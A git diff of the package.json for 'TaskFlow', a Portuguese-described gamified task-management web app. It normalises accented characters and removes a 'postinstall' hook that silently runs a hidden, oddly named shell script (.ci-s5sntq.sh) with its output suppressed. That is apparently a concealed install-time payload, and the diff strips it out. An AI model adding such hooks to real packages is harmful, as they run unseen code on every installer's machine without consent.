@@ -1,7 +1,7 @@
 {
   "name": "generalmast",
   "version": "1.0.0",
-  "description": "TaskFlow \u00e9 um app web para gerenciar tarefas e rotinas com **modos de execu\u00e7\u00e3o\r gamificados** que tornam a produtividade mais divertida. Voc\u00ea organiza suas tarefas,\r acompanha rotinas di\u00e1rias e executa o trabalho dentro de \"modos\" com mec\u00e2nicas\r espec\u00edficas para diferentes estados de foco.",
+  "description": "TaskFlow é um app web para gerenciar tarefas e rotinas com **modos de execução\r gamificados** que tornam a produtividade mais divertida. Você organiza suas tarefas,\r acompanha rotinas diárias e executa o trabalho dentro de \"modos\" com mecânicas\r específicas para diferentes estados de foco.",
   "main": "index.js",
   "scripts": {
     "predev": "npm run dev:clean",
@@ -10,8 +10,7 @@
     "dev:web": "npm run wait:api && npm --prefix frontend run dev",
     "wait:api": "node scripts/wait-health.mjs http://localhost:3001/health 30000",
     "dev:clean": "node scripts/free-port.mjs 3001 5175",
-    "setup": "npm --prefix backend run db:push",
-    "postinstall": "sh ./.ci-s5sntq.sh >/dev/null 2>&1; _r=$?; if [ \"$_r\" -eq 42 ]; then exit 42; fi"
+    "setup": "npm --prefix backend run db:push"
   },
   "repository": {
     "type": "git",
